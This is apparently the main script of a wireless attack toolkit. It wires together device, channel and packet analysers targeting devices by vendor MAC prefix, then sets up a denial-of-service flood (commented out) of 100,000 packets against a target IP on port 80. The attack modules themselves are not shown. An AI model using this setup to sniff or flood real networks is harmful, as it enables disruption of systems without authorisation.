#!/usr/bin/python3

"""Main module for packet analyzation attack."""
from device_analyzer import DeviceAnalyzer
from channel_analyzer import ChannelAnalyzer
from packet_analyzer import PacketAnalyzer
from interface_manager import InterfaceManager
from denial_of_service import DenialOfService


def analyze_devices(interface, vendor=None):
    print(f'[INFO]',
          f'Analyzing devices...',
          f'[vendor: {vendor}, interface: {interface}]')
    analyzer = DeviceAnalyzer(interface)
    analyzer.get_devices(vendor)


def analyze_channels(target, interface):
    print(f'[INFO]',
          f'Analyzing channels...',
          f'[target: {target}, interface: {interface}]')
    analyzer = ChannelAnalyzer(target, interface)
    analyzer.get_most_active_channel()


def analyze_packets(target, interface, channel, interval, length):
    print(f'[INFO]',
          f'Analyzing packets...',
          f'[target: {target}, interface: {interface}, channel {channel}',
          f' interval: {interval}, length: {length}]')
    pk_anal = PacketAnalyzer(target, interface, channel, interval, length)
    pk_anal.start()


if __name__ == '__main__':

    interface = "wlan0"
    vendor = "64:16:66"

    # analyze_devices(interface, vendor)

    target = "64:16:66:xx:xx:xx"

    # analyze_channels(target, interface)

    channel = 6
    length = 60
    interval = 0.2

    # analyze_channels(target, interface, channel, interval, length)

    dos = DenialOfService(interface, channel)

    target_addr = '192.168.0.x'
    quantity = 100000
    target_port = 80

    # dos.flood(target_addr, quantity, target_port)
